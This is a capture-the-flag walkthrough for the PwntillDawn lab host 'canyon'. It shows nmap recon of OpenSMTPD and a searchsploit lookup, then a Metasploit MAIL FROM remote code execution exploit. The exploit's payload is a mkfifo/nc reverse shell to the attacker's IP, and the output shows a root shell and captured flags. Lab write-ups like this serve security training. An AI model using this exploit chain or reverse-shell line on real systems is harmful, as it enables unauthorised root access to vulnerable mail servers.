target : 10.150.150.188 on PwntillDawn
## Recon
```
nmap -sS -vvv -A $ip
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE         REASON         VERSION
22/tcp  open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5fa69ec9f6dbffa476d058ecefd3e7f6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDow5BVTevH0G94c3Xh2aE5OVgpXrHhm6n6XdUP62fsO3KKDiQ/NxsgdcQQz94UJ3UdyusUYKfGTtOuHFDAHRGivbN5noBw2uX8cNwuUjveP0rcvq+Wo5d4S07uuTWucJACWkw1+6zNcONUs74UE2vUa7h+XABKHPjKA8iA8T+5yvXp9NOtdnGkk1xeO4AFHhFD2N0Cboeu1eUVbIiq0QP51Cv2px/m7dwP1EczYArfLoLSDvT+pUYLDutuLmeoUhtOyMQvNxLYDFWuklC2ix5qcQjbFErYW31ltJRaab9RfRk93w89lrUYK5RHDwKE9l0CfWm5SXKNkiJlZzEOnOl8QqpZVFpmX4X0Wsm5BLaLh02ATSLkkSEbvQ3PQ9fLzDTWnjO32fkyaIekn3hPhHC+NOvnQ0r7mDkX2/FAjEN+xdNbQGBYMnorpVqvRFgckKKyDB52GOdXpPzaokJGeEZaYTSvHVLwJdthmzDAXN5aHwDj7P00fWR5wlrCRYETjZ0=
|   256 a501d9ad99211a72bf98a794c42c6a1a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQEc4wDHE0Bf8tMMcGRjLn15WidGXGos5W+cTHTVa4jiD+1PRVR4bUjXGI96YRtr288IVqCts6ZRAvoJSoeOmI=
|   256 557363ce61afcd9f745de27b45f5159d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN2Tf/Au68gWK2E+ixkgi33xjyKmmozHXBDvi9BP0Jx0
25/tcp  open  smtp            syn-ack ttl 63 OpenSMTPD
| smtp-commands: canyon Hello nmap.scanme.org [127.0.0.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
777/tcp open  multiling-http? syn-ack ttl 63
OS fingerprint not ideal because: maxTimingRatio (1.926000e+00) is greater than 1.4
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=10/31%OT=22%CT=1%CU=44700%PV=Y%DS=2%DC=T%G=N%TM=65419043%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%TS=9)
SEQ(SP=FD%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 32.867 days (since Fri Sep 29 02:51:15 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: canyon; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   808.63 ms 10.66.66.1
2   716.22 ms 10.150.150.188

```
I will dive on the port 25, 
```
└─# nc -v $ip 25                        
10.150.150.188: inverse host lookup failed: Unknown host
(UNKNOWN) [10.150.150.188] 25 (smtp) open
220 canyon ESMTP OpenSMTPD
```
```
└─# searchsploit OpenSMTPD
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                   | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)               | linux/local/48185.rb
OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Executi | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                    | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                      | linux/remote/48139.c
OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution   | openbsd/remote/48140.c
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Now i just go to metasploit and then try to find the one.
I used this
```
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                   | linux/remote/48038.rb
mkfifo /tmp/fbizp; nc 10.66.66.82 4444 0</tmp/fbizp | /bin/sh >/tmp/fbizp 2>&1; rm /tmp/fbizp
[*] 10.150.150.188:25 - Sending: .
[*] 10.150.150.188:25 - Expecting: /250.*Message accepted for delivery/
[*] 10.150.150.188:25 - Sending: QUIT
[*] 10.150.150.188:25 - Expecting: /221.*Bye/
[*] Command shell session 1 opened (10.66.66.82:4444 -> 10.150.150.188:34340) at 2023-10-31 23:46:05 +0000

id
uid=0(root) gid=0(root) groups=0(root)
cat FLAG1.txt
cf763df99ebb81988e74fa1e835d0c34fdd22827
root@canyon:/home/jonny# cat /etc/passwd
jonny:x:1000:1000:Jonny FLAG2 0465b05a71d7f037016df4ef07bf93524e46ed85:/home/jonny:/bin/bash


```